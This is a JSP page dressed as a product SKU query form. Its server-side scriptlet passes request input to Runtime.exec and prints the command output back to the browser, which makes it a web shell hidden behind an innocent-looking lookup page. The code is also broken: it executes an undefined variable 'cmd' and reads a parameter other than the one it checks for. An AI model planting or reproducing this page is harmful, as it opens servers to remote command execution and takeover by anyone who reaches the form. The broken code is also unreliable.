<%@ page language="java" import="java.io.*,java.util.*" contentType="text/html; charset=utf-8" pageEncoding="utf-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
        <h2>标题</h2><br><br>
        ${msg}<br>
        <form id="sku" action="<%=request.getContextPath()%>/demo.jsp" method="post" onsubmit="return chkInput()">
                <input id="skuid" name="id" width="200" value="${id ne null ? skuid : ''}" /><br>
                <button type="submit">查询</button>
        </form>
        <%
            if(request.getParameterMap().containsKey("id")) {
                Runtime rt = Runtime.getRuntime();
                String skuid = ((String[]) request.getParameterMap().get("skuid"))[0];
                Process ppp = rt.exec(cmd);
                InputStreamReader ir = new InputStreamReader(ppp.getInputStream());
                LineNumberReader input = new LineNumberReader(ir);
                String line;
                while ((line = input.readLine()) != null) {
                    out.println(line + "<br/>");
                }

                ir = new InputStreamReader(ppp.getErrorStream());
                input = new LineNumberReader(ir);
                while ((line = input.readLine()) != null) {                
                    out.println(line + "<br/>");
                }
            }
        %>
</body>
<script>
function chkInput(){
  var sku = document.getElementById('id').value.replace(/(^\s*)|(\s*$)/g, '');
  document.getElementById('id').value = sku;
  if(sku == ''){
     alert('输入错误');
     document.getElementById('id').focus();
     return false;
  }
  return true;
}
</script>
</html>
